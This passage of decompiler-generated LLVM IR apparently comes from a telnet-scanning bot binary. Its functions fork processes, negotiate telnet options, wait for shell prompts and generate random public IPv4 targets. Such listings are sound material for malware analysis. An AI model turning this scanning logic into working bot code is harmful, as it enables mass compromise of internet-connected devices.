  %v3_804965a = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049662 = and i32 %v3_804965a, -2049
  %v3_804967e = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049662)
  br label %dec_label_pc_804968d

dec_label_pc_804968d:                             ; preds = %dec_label_pc_8049557, %dec_label_pc_8049567, %dec_label_pc_80495dd, %entry, %dec_label_pc_8049644
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_8049644 ], [ 0, %entry ], [ 0, %dec_label_pc_80495dd ], [ 0, %dec_label_pc_8049567 ], [ 0, %dec_label_pc_8049557 ]
  %v2_8049699 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049699, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_804968d, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804969f = load i32, i32* @ebx, align 4
  store i32 %v0_804969f, i32* %stack_var_-8, align 4
  %v1_80496a3 = call i32 @__libc_fork(i32 %v0_804969f)
  %v4_80496ab = icmp eq i32 %v1_80496a3, 0
  %v1_80496af = icmp eq i1 %v4_80496ab, false
  br i1 %v1_80496af, label %dec_label_pc_80496bc, label %dec_label_pc_80496b1

dec_label_pc_80496b1:                             ; preds = %entry
  br label %dec_label_pc_8049798

dec_label_pc_80496bc:                             ; preds = %entry
  %v0_80496bc = load i32, i32* @global_var_8055908.28, align 8
  %v0_80496c1 = load i32, i32* @global_var_805590c.29, align 4
  %v1_80496c7 = add i32 %v0_80496bc, 1
  %v5_80496c7 = icmp eq i32 %v0_80496bc, -1
  %v2_80496ca = zext i1 %v5_80496c7 to i32
  %v3_80496ca = add i32 %v2_80496ca, %v0_80496c1
  store i32 %v1_80496c7, i32* @global_var_8055908.28, align 8
  store i32 %v3_80496ca, i32* @global_var_805590c.29, align 4
  %v2_80496e7 = mul i32 %v1_80496c7, 4
  %v1_80496ea = add i32 %v2_80496e7, 4
  %v1_80496f0 = call i32 @malloc(i32 %v1_80496ea)
  br label %dec_label_pc_8049723

dec_label_pc_8049701:                             ; preds = %dec_label_pc_8049723, %dec_label_pc_8049754
  %v2_8049704 = mul i32 %storemerge1, 4
  %v5_8049709 = add i32 %v2_8049704, %v1_80496f0
  %v0_8049714 = load i32, i32* @global_var_805b988.30, align 8
  %v2_8049719 = add i32 %v0_8049714, %v2_8049704
  %v1_804971c = inttoptr i32 %v2_8049719 to i32*
  %v2_804971c = load i32, i32* %v1_804971c, align 4
  %v2_804971e = inttoptr i32 %v5_8049709 to i32*
  store i32 %v2_804971c, i32* %v2_804971e, align 4
  %v4_8049720 = add i32 %storemerge1, 1
  br label %dec_label_pc_8049723

dec_label_pc_8049723:                             ; preds = %dec_label_pc_80496bc, %dec_label_pc_8049701
  %storemerge1 = phi i32 [ %v4_8049720, %dec_label_pc_8049701 ], [ 0, %dec_label_pc_80496bc ]
  %v0_8049731 = load i32, i32* @global_var_8055908.28, align 8
  %v0_8049736 = load i32, i32* @global_var_805590c.29, align 4
  %v4_8049740 = icmp ne i32 %v0_8049731, 0
  %v2_8049743 = zext i1 %v4_8049740 to i32
  %v3_8049743 = add i32 %v0_8049736, -1
  %v4_8049743 = add i32 %v3_8049743, %v2_8049743
  store i32 %v4_8049743, i32* @ebx, align 4
  %v10_804974f = icmp eq i32 %v4_8049743, 0
  br i1 %v10_804974f, label %dec_label_pc_8049754, label %dec_label_pc_8049701

dec_label_pc_8049754:                             ; preds = %dec_label_pc_8049723
  %v1_8049740 = add i32 %v0_8049731, -1
  %v10_804975f = icmp ult i32 %storemerge1, %v1_8049740
  br i1 %v10_804975f, label %dec_label_pc_8049701, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_8049754
  %v2_804976f = mul i32 %v0_8049731, 4
  %v5_8049772 = add i32 %v2_804976f, %v1_80496f0
  %v1_8049775 = add i32 %v5_8049772, -4
  store i32 %v1_8049775, i32* @edx, align 4
  %v2_804977b = inttoptr i32 %v1_8049775 to i32*
  store i32 %v1_80496a3, i32* %v2_804977b, align 4
  %v0_804977d = load i32, i32* @global_var_805b988.30, align 8
  %v1_8049785 = call i32 @free(i32 %v0_804977d)
  store i32 %v1_80496f0, i32* @global_var_805b988.30, align 8
  store i32 %v1_80496a3, i32* @ecx, align 4
  br label %dec_label_pc_8049798

dec_label_pc_8049798:                             ; preds = %dec_label_pc_80496b1, %dec_label_pc_8049764
  %v2_804979e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804979e, i32* @ebx, align 4
  ret i32 %v1_80496a3

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049704, { 1, 0 }
  uselistorder i32 %v1_80496f0, { 2, 0, 1 }
  uselistorder i32 %v0_80496bc, { 1, 0 }
  uselistorder label %dec_label_pc_8049798, { 1, 0 }
  uselistorder label %dec_label_pc_8049723, { 1, 0 }
  uselistorder label %dec_label_pc_8049701, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80497a1 = load i32, i32* @ebp, align 4
  store i32 %v0_80497a1, i32* %stack_var_-4, align 4
  %v1_80497aa = add i32 %arg2, 1
  %v1_80497ab = inttoptr i32 %v1_80497aa to i8*
  %v2_80497ab = load i8, i8* %v1_80497ab, align 1
  %v9_80497b4 = icmp ult i8 %v2_80497ab, -5
  br i1 %v9_80497b4, label %dec_label_pc_80498bf, label %dec_label_pc_80497c1

dec_label_pc_80497c1:                             ; preds = %entry
  %v7_80497c8 = icmp eq i8 %v2_80497ab, -1
  br i1 %v7_80497c8, label %dec_label_pc_80497ca, label %dec_label_pc_80497e4

dec_label_pc_80497ca:                             ; preds = %dec_label_pc_80497c1
  br label %dec_label_pc_80498bf

dec_label_pc_80497e4:                             ; preds = %dec_label_pc_80497c1
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_80497f8 = ptrtoint i8* %stack_var_-5 to i32
  %v4_8049805 = call i32 @__libc_send(i32 %arg1, i32 %v2_80497f8, i32 1, i32 16384)
  %v2_804980e = load i8, i8* %v1_80497ab, align 1
  %v11_8049811 = icmp eq i8 %v2_804980e, -4
  %v1_8049813 = icmp eq i1 %v11_8049811, false
  br i1 %v1_8049813, label %dec_label_pc_804981b, label %dec_label_pc_8049815

dec_label_pc_8049815:                             ; preds = %dec_label_pc_80497e4
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049871

dec_label_pc_804981b:                             ; preds = %dec_label_pc_80497e4
  %v2_804981f = load i8, i8* %v1_80497ab, align 1
  %v11_8049822 = icmp eq i8 %v2_804981f, -2
  %v1_8049824 = icmp eq i1 %v11_8049822, false
  br i1 %v1_8049824, label %dec_label_pc_804982c, label %dec_label_pc_8049826

dec_label_pc_8049826:                             ; preds = %dec_label_pc_804981b
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049871

dec_label_pc_804982c:                             ; preds = %dec_label_pc_804981b
  %v2_8049830 = load i8, i8* %v1_80497ab, align 1
  %v10_8049833 = icmp eq i8 %v2_8049830, 3
  %v1_8049835 = icmp eq i1 %v10_8049833, false
  %v11_804985c = icmp eq i8 %v2_8049830, -3
  %v1_804985e = icmp eq i1 %v11_804985c, false
  br i1 %v1_8049835, label %dec_label_pc_8049855, label %dec_label_pc_8049837

dec_label_pc_8049837:                             ; preds = %dec_label_pc_804982c
  %. = select i1 %v1_804985e, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049871

dec_label_pc_8049855:                             ; preds = %dec_label_pc_804982c
  %.3 = select i1 %v1_804985e, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049871

dec_label_pc_8049871:                             ; preds = %dec_label_pc_8049837, %dec_label_pc_8049826, %dec_label_pc_8049815, %dec_label_pc_8049855
  %v4_804988e = call i32 @__libc_send(i32 %arg1, i32 %v2_80497f8, i32 1, i32 16384)
  %v1_8049896 = add i32 %arg2, 2
  %v4_80498b3 = call i32 @__libc_send(i32 %arg1, i32 %v1_8049896, i32 1, i32 16384)
  %v2_80498c2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80498bf

dec_label_pc_80498bf:                             ; preds = %dec_label_pc_80497ca, %dec_label_pc_8049871, %entry
  %v2_80498c2 = phi i32 [ %v0_80497a1, %dec_label_pc_80497ca ], [ %v2_80498c2.pre, %dec_label_pc_8049871 ], [ %v0_80497a1, %entry ]
  store i32 %v2_80498c2, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80498bf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049871, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80498c7 = load i32, i32* @edi, align 4
  store i32 %v0_80498c7, i32* %stack_var_-8, align 4
  %v4_80498d2 = ptrtoint i8* %arg1 to i32
  %v3_80498e3 = call i32 @_strlen(i8* %arg1)
  %v4_80498e3 = mul i32 %v3_80498e3, -1
  %v1_80498e9 = sub i32 0, %v4_80498e3
  %v6_8049910 = sub i32 %v4_80498d2, %v4_80498e3
  br label %dec_label_pc_8049998

dec_label_pc_8049900:                             ; preds = %dec_label_pc_8049953, %dec_label_pc_804993b, %dec_label_pc_8049923, %dec_label_pc_804990b
  %v4_8049900 = add nsw i32 %stack_var_-12.032, 1
  %v7_8049909 = icmp slt i32 %v4_8049900, %v1_80498e9
  br i1 %v7_8049909, label %dec_label_pc_804990b, label %dec_label_pc_8049903.dec_label_pc_804996b_crit_edge

dec_label_pc_8049903.dec_label_pc_804996b_crit_edge: ; preds = %dec_label_pc_8049900, %dec_label_pc_8049903.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049903.preheader ], [ %v4_8049900, %dec_label_pc_8049900 ]
  %.pre = sub i32 %v6_8049910, %stack_var_-12.0.lcssa
  %.pre9 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804996b

dec_label_pc_804990b:                             ; preds = %dec_label_pc_8049903.preheader, %dec_label_pc_8049900
  %stack_var_-12.032 = phi i32 [ %v4_8049900, %dec_label_pc_8049900 ], [ %stack_var_-12.1, %dec_label_pc_8049903.preheader ]
  %v2_8049918 = sub i32 %v6_8049910, %stack_var_-12.032
  %v1_804991c = inttoptr i32 %v2_8049918 to i8*
  %v2_804991c = load i8, i8* %v1_804991c, align 1
  %v4_804991f = icmp eq i8 %v2_804991c, 0
  br i1 %v4_804991f, label %dec_label_pc_8049900, label %dec_label_pc_8049923

dec_label_pc_8049923:                             ; preds = %dec_label_pc_804990b
  %v2_8049934 = load i8, i8* %v1_804991c, align 1
  %v7_8049937 = icmp eq i8 %v2_8049934, 32
  br i1 %v7_8049937, label %dec_label_pc_8049900, label %dec_label_pc_804993b

dec_label_pc_804993b:                             ; preds = %dec_label_pc_8049923
  %v2_804994c = load i8, i8* %v1_804991c, align 1
  %v10_804994f = icmp eq i8 %v2_804994c, 13
  br i1 %v10_804994f, label %dec_label_pc_8049900, label %dec_label_pc_8049953

dec_label_pc_8049953:                             ; preds = %dec_label_pc_804993b
  %v2_8049964 = load i8, i8* %v1_804991c, align 1
  %v10_8049967 = icmp eq i8 %v2_8049964, 10
  br i1 %v10_8049967, label %dec_label_pc_8049900, label %dec_label_pc_804996b

dec_label_pc_804996b:                             ; preds = %dec_label_pc_8049953, %dec_label_pc_8049903.dec_label_pc_804996b_crit_edge
  %stack_var_-12.022 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049903.dec_label_pc_804996b_crit_edge ], [ %stack_var_-12.032, %dec_label_pc_8049953 ]
  %v1_804997c.pre-phi = phi i8* [ %.pre9, %dec_label_pc_8049903.dec_label_pc_804996b_crit_edge ], [ %v1_804991c, %dec_label_pc_8049953 ]
  %v2_804997c = load i8, i8* %v1_804997c.pre-phi, align 1
  %v6_8049982 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_8052e5c.31 to i32)
  %v1_8049985 = inttoptr i32 %v6_8049982 to i8*
  %v2_8049985 = load i8, i8* %v1_8049985, align 1
  %v15_8049988 = icmp eq i8 %v2_804997c, %v2_8049985
  %v1_804998a = icmp eq i1 %v15_8049988, false
  br i1 %v1_804998a, label %dec_label_pc_8049995, label %dec_label_pc_80499c2

dec_label_pc_8049995:                             ; preds = %dec_label_pc_804996b
  %v4_8049995 = add i32 %storemerge2, 1
  br label %dec_label_pc_8049998

dec_label_pc_8049998:                             ; preds = %entry, %dec_label_pc_8049995
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.022, %dec_label_pc_8049995 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v4_8049995, %dec_label_pc_8049995 ]
  %v3_80499ac = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8052e5c.31, i32 0, i32 0))
  %v7_80499b3 = icmp ult i32 %storemerge2, %v3_80499ac
  br i1 %v7_80499b3, label %dec_label_pc_8049903.preheader, label %dec_label_pc_80499c2

dec_label_pc_8049903.preheader:                   ; preds = %dec_label_pc_8049998
  %v7_804990931 = icmp slt i32 %stack_var_-12.1, %v1_80498e9
  br i1 %v7_804990931, label %dec_label_pc_804990b, label %dec_label_pc_8049903.dec_label_pc_804996b_crit_edge

dec_label_pc_80499c2:                             ; preds = %dec_label_pc_8049998, %dec_label_pc_804996b
  %storemerge = phi i32 [ 1, %dec_label_pc_804996b ], [ 0, %dec_label_pc_8049998 ]
  %v2_80499c8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80499c8, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049910, { 1, 0 }
  uselistorder [6 x i8]* @global_var_8052e5c.31, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049998, { 1, 0 }
  uselistorder label %dec_label_pc_8049903.dec_label_pc_804996b_crit_edge, { 1, 0 }
}

define i32 @readUntil() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80499ce = load i32, i32* @edi, align 4
  store i32 %v0_80499ce, i32* %stack_var_-8, align 4
  store i32 %tmp20, i32* %stack_var_-168, align 4
  %v2_8049a11 = ptrtoint i32* %stack_var_-160 to i32
  %tmp31 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049a2b = urem i32 %tmp14, 32
  %v9_8049a2e = shl i32 1, %v1_8049a2b
  %v1_8049a39 = add i32 %tmp14, 1
  %v2_8049a3a = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049b3b = inttoptr i32 %tmp7 to i8*
  %v4_8049b4e = icmp eq i32 %tmp6, 0
  %v1_8049b5a = inttoptr i32 %tmp9 to i8*
  %v1_8049b6f39 = add i32 %tmp24, 2
  %v5_8049b7548 = icmp slt i32 %v1_8049b6f39, %tmp
  br i1 %v5_8049b7548, label %dec_label_pc_8049b77.lr.ph, label %dec_label_pc_8049b93

dec_label_pc_8049b77.lr.ph:                       ; preds = %entry
  %v2_8049a25 = udiv i32 %tmp14, 32
  %v2_8049a2e = mul nuw nsw i32 %v2_8049a25, 4
  %v3_8049a2e = add nsw i32 %v2_8049a2e, -156
  %tmp35 = icmp slt i32 %tmp19, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br label %dec_label_pc_8049b77

dec_label_pc_8049a07:                             ; preds = %dec_label_pc_8049b85, %dec_label_pc_8049b77
  store i32 %v2_8049a11, i32* @edi, align 4
  %v5_8049a18 = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  %v0_8049a2e = load i32, i32* @ebp, align 4
  %v4_8049a2e = add i32 %v3_8049a2e, %v0_8049a2e
  %v5_8049a2e = inttoptr i32 %v4_8049a2e to i32*
  %v6_8049a2e = load i32, i32* %v5_8049a2e, align 4
  %v12_8049a2e = or i32 %v6_8049a2e, %v9_8049a2e
  store i32 %v12_8049a2e, i32* %v5_8049a2e, align 4
  %v6_8049a61 = call i32 @__libc_select(i32 %v1_8049a39, i32 %v2_8049a11, i32 0, i32 0, i32 %v2_8049a3a)
  %tmp32 = icmp slt i32 %v6_8049a61, 1
  br i1 %tmp32, label %dec_label_pc_8049b93, label %dec_label_pc_8049a6e

dec_label_pc_8049a6e:                             ; preds = %dec_label_pc_8049a07
  %v5_8049a71 = add i32 %v4_8049b6c49, %tmp9
  %v5_8049a74 = inttoptr i32 %v5_8049a71 to i8*
  %v5_8049a94 = call i32 @__libc_recv(i32 %tmp14, i32 %v5_8049a71, i32 1, i32 0)
  %v14_8049a9c = icmp eq i32 %v5_8049a94, -1
  br i1 %v14_8049a9c, label %dec_label_pc_8049baf, label %dec_label_pc_8049aa2

dec_label_pc_8049aa2:                             ; preds = %dec_label_pc_8049a6e
  %v5_8049aa2 = icmp eq i32 %v5_8049a94, 0
  %v1_8049aa6 = icmp eq i1 %v5_8049aa2, false
  br i1 %v1_8049aa6, label %dec_label_pc_8049ab7, label %dec_label_pc_8049baf

dec_label_pc_8049ab7:                             ; preds = %dec_label_pc_8049aa2
  %v6_8049aba = add i32 %v5_8049a94, %v4_8049b6c49
  %v26_8049aba = inttoptr i32 %v6_8049aba to i8*
  %v2_8049ac0 = load i8, i8* %v5_8049a74, align 1
  %v11_8049ac3 = icmp eq i8 %v2_8049ac0, -1
  %v1_8049ac5 = icmp eq i1 %v11_8049ac3, false
  br i1 %v1_8049ac5, label %dec_label_pc_8049b38, label %dec_label_pc_8049ac7

dec_label_pc_8049ac7:                             ; preds = %dec_label_pc_8049ab7
  %v1_8049aca = add i32 %v5_8049a71, 1
  %v5_8049ae5 = call i32 @__libc_recv(i32 %tmp14, i32 %v1_8049aca, i32 2, i32 0)
  %v14_8049aed = icmp eq i32 %v5_8049ae5, -1
  br i1 %v14_8049aed, label %dec_label_pc_8049baf, label %dec_label_pc_8049af3

dec_label_pc_8049af3:                             ; preds = %dec_label_pc_8049ac7
  %v5_8049af3 = icmp eq i32 %v5_8049ae5, 0
  %v1_8049af7 = icmp eq i1 %v5_8049af3, false
  br i1 %v1_8049af7, label %dec_label_pc_8049b08, label %dec_label_pc_8049baf

dec_label_pc_8049b08:                             ; preds = %dec_label_pc_8049af3
  %v6_8049b0b = add i32 %v5_8049ae5, %v6_8049aba
  %v26_8049b0b = inttoptr i32 %v6_8049b0b to i8*
  %v4_8049b23 = call i32 @negotiate(i32 %tmp14, i32 %v5_8049a71, i32 3)
  %v1_8049b28 = icmp eq i32 %v4_8049b23, 0
  %v1_8049b2a = icmp eq i1 %v1_8049b28, false
  br i1 %v1_8049b2a, label %dec_label_pc_8049b6c.backedge, label %dec_label_pc_8049baf

dec_label_pc_8049b6c.backedge:                    ; preds = %dec_label_pc_8049b08, %dec_label_pc_8049b4e, %dec_label_pc_8049b54
  %stack_var_-32.0.be = phi i8* [ %v26_8049aba, %dec_label_pc_8049b4e ], [ %v26_8049aba, %dec_label_pc_8049b54 ], [ %v26_8049b0b, %dec_label_pc_8049b08 ]
  %v4_8049b6c = ptrtoint i8* %stack_var_-32.0.be to i32
  %v1_8049b6f = add i32 %v4_8049b6c, 2
  %v5_8049b75 = icmp slt i32 %v1_8049b6f, %tmp
  br i1 %v5_8049b75, label %dec_label_pc_8049b6c.backedge.dec_label_pc_8049b77_crit_edge, label %dec_label_pc_8049b93

dec_label_pc_8049b6c.backedge.dec_label_pc_8049b77_crit_edge: ; preds = %dec_label_pc_8049b6c.backedge
  %v3_8049b77.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049b77

dec_label_pc_8049b38:                             ; preds = %dec_label_pc_8049ab7
  %v4_8049b45 = call i32 @strstr(i32 %tmp9, i8* %v5_8049b3b)
  %v1_8049b4a = icmp eq i32 %v4_8049b45, 0
  %v1_8049b4c = icmp eq i1 %v1_8049b4a, false
  br i1 %v1_8049b4c, label %dec_label_pc_8049b93, label %dec_label_pc_8049b4e

dec_label_pc_8049b4e:                             ; preds = %dec_label_pc_8049b38
  br i1 %v4_8049b4e, label %dec_label_pc_8049b6c.backedge, label %dec_label_pc_8049b54

dec_label_pc_8049b54:                             ; preds = %dec_label_pc_8049b4e
  %v2_8049b5a = call i32 @matchPrompt(i8* %v1_8049b5a)
  %v1_8049b5f = icmp eq i32 %v2_8049b5a, 0
  br i1 %v1_8049b5f, label %dec_label_pc_8049b6c.backedge, label %dec_label_pc_8049b93

dec_label_pc_8049b77:                             ; preds = %dec_label_pc_8049b6c.backedge.dec_label_pc_8049b77_crit_edge, %dec_label_pc_8049b77.lr.ph
  %v3_8049b77 = phi i32 [ %tmp20, %dec_label_pc_8049b77.lr.ph ], [ %v3_8049b77.pre, %dec_label_pc_8049b6c.backedge.dec_label_pc_8049b77_crit_edge ]
  %v4_8049b6c49 = phi i32 [ %tmp24, %dec_label_pc_8049b77.lr.ph ], [ %v4_8049b6c, %dec_label_pc_8049b6c.backedge.dec_label_pc_8049b77_crit_edge ]
  %tmp33 = icmp slt i32 %v3_8049b77, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_8049a07, label %dec_label_pc_8049b85

dec_label_pc_8049b85:                             ; preds = %dec_label_pc_8049b77
  br i1 %tmp36, label %dec_label_pc_8049a07, label %dec_label_pc_8049b93

dec_label_pc_8049b93:                             ; preds = %dec_label_pc_8049a07, %dec_label_pc_8049b85, %dec_label_pc_8049b6c.backedge, %dec_label_pc_8049b54, %dec_label_pc_8049b38, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8049b38 ], [ 1, %dec_label_pc_8049b54 ], [ 0, %dec_label_pc_8049b6c.backedge ], [ 0, %dec_label_pc_8049b85 ], [ 0, %dec_label_pc_8049a07 ]
  br label %dec_label_pc_8049baf

dec_label_pc_8049baf:                             ; preds = %dec_label_pc_8049b08, %dec_label_pc_8049ac7, %dec_label_pc_8049af3, %dec_label_pc_8049a6e, %dec_label_pc_8049aa2, %dec_label_pc_8049b93
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049b93 ], [ 0, %dec_label_pc_8049aa2 ], [ 0, %dec_label_pc_8049a6e ], [ 0, %dec_label_pc_8049af3 ], [ 0, %dec_label_pc_8049ac7 ], [ 0, %dec_label_pc_8049b08 ]
  %v2_8049bbb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049bbb, i32* @edi, align 4
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %v5_8049ae5, { 1, 2, 0 }
  uselistorder i32 %v5_8049a94, { 1, 2, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %tmp14, { 5, 4, 3, 0, 2, 1 }
  uselistorder i32 %tmp9, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049baf, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049b93, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049b6c.backedge, { 2, 1, 0 }
}

define i32 @getRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8049bc1 = load i32, i32* @esi, align 4
  %v0_8049bc2 = load i32, i32* @ebx, align 4
  store i32 %v0_8049bc2, i32* %stack_var_-12, align 4
  %v2_8049bcd = call i32 @random()
  %v2_8049bef = sdiv i32 %v2_8049bcd, 51
  store i32 %v2_8049bef, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049bef, -253
  %v2_8049c05 = add i32 %v2_8049bcd, %tmp
  store i32 %v2_8049c05, i32* @eax, align 4
  %v1_8049c11 = call i32 @random()
  %v2_8049c33 = sdiv i32 %v1_8049c11, 51
  store i32 %v2_8049c33, i32* @ebx, align 4
  %tmp65 = mul i32 %v2_8049c33, -255
  %v2_8049c43 = add i32 %v1_8049c11, %tmp65
  store i32 %v2_8049c43, i32* @eax, align 4
  %v1_8049c4f = call i32 @random()
  %v2_8049c71 = sdiv i32 %v1_8049c4f, 51
  store i32 %v2_8049c71, i32* @ebx, align 4
  %tmp66 = mul i32 %v2_8049c71, -255
  %v2_8049c81 = add i32 %v1_8049c4f, %tmp66
  store i32 %v2_8049c81, i32* @eax, align 4
  %v1_8049c8d = call i32 @random()
  %v2_8049caf = sdiv i32 %v1_8049c8d, 51
  store i32 %v2_8049caf, i32* @ebx, align 4
  %tmp67 = mul i32 %v2_8049caf, -255
  %v2_8049cbf = add i32 %v1_8049c8d, %tmp67
  br label %dec_label_pc_8049dce

dec_label_pc_8049cd0:                             ; preds = %dec_label_pc_8049ee2, %dec_label_pc_8049ed6, %dec_label_pc_8049eba, %dec_label_pc_8049e9e, %dec_label_pc_8049e92, %dec_label_pc_8049e7e, %dec_label_pc_8049e6a, %dec_label_pc_8049e4e, %dec_label_pc_8049e32, %dec_label_pc_8049e16, %dec_label_pc_8049e02, %dec_label_pc_8049df6, %dec_label_pc_8049dda, %dec_label_pc_8049dce
  %v0_8049cd0 = call i32 @random()
  %v2_8049cf2 = sdiv i32 %v0_8049cd0, 51
  store i32 %v2_8049cf2, i32* @ebx, align 4
  %tmp68 = mul i32 %v2_8049cf2, -253
  %v2_8049d08 = add i32 %v0_8049cd0, %tmp68
  store i32 %v2_8049d08, i32* @eax, align 4
  %v1_8049d14 = call i32 @random()
  %v2_8049d36 = sdiv i32 %v1_8049d14, 51
  store i32 %v2_8049d36, i32* @ebx, align 4
  %tmp69 = mul i32 %v2_8049d36, -255
  %v2_8049d46 = add i32 %v1_8049d14, %tmp69
  store i32 %v2_8049d46, i32* @eax, align 4
  %v1_8049d52 = call i32 @random()
  %v2_8049d74 = sdiv i32 %v1_8049d52, 51
  store i32 %v2_8049d74, i32* @ebx, align 4
  %tmp70 = mul i32 %v2_8049d74, -255
  %v2_8049d84 = add i32 %v1_8049d52, %tmp70
  store i32 %v2_8049d84, i32* @eax, align 4
  %v1_8049d90 = call i32 @random()
  %v2_8049db2 = sdiv i32 %v1_8049d90, 51
  store i32 %v2_8049db2, i32* @ebx, align 4
  %tmp71 = mul i32 %v2_8049db2, -255
  %v2_8049dc2 = add i32 %v1_8049d90, %tmp71
  br label %dec_label_pc_8049dce

dec_label_pc_8049dce:                             ; preds = %entry, %dec_label_pc_8049cd0
  %storemerge36.in = phi i32 [ %v2_8049dc2, %dec_label_pc_8049cd0 ], [ %v2_8049cbf, %entry ]
  %stack_var_-14.0.in.in = phi i32 [ %v2_8049d84, %dec_label_pc_8049cd0 ], [ %v2_8049c81, %entry ]
  %stack_var_-15.0.in.in = phi i32 [ %v2_8049d46, %dec_label_pc_8049cd0 ], [ %v2_8049c43, %entry ]
  %stack_var_-16.0.in = phi i32 [ %v2_8049d08, %dec_label_pc_8049cd0 ], [ %v2_8049c05, %entry ]
  %stack_var_-15.0.in = trunc i32 %stack_var_-15.0.in.in to i8
  %stack_var_-14.0.in = trunc i32 %stack_var_-14.0.in.in to i8
  store i32 %stack_var_-16.0.in, i32* @eax, align 4
  %v3_8049dd2 = trunc i32 %stack_var_-16.0.in to i8
  %v4_8049dd2 = icmp eq i8 %v3_8049dd2, 0
  br i1 %v4_8049dd2, label %dec_label_pc_8049cd0, label %dec_label_pc_8049dda

dec_label_pc_8049dda:                             ; preds = %dec_label_pc_8049dce
  store i32 %stack_var_-16.0.in, i32* @eax, align 4
  %v10_8049dde = icmp eq i8 %v3_8049dd2, 10
  br i1 %v10_8049dde, label %dec_label_pc_8049cd0, label %dec_label_pc_8049de6

dec_label_pc_8049de6:                             ; preds = %dec_label_pc_8049dda
  %v10_8049dea = icmp eq i8 %v3_8049dd2, 100
  %v1_8049dec = icmp eq i1 %v10_8049dea, false
  br i1 %v1_8049dec, label %dec_label_pc_8049e02, label %dec_label_pc_8049dee

dec_label_pc_8049dee:                             ; preds = %dec_label_pc_8049de6
  %tmp72 = icmp ult i8 %stack_var_-15.0.in, 64
  br i1 %tmp72, label %dec_label_pc_8049e02, label %dec_label_pc_8049df6

dec_label_pc_8049df6:                             ; preds = %dec_label_pc_8049dee
  %v4_8049dee16 = urem i32 %stack_var_-15.0.in.in, 256
  store i32 %v4_8049dee16, i32* @eax, align 4
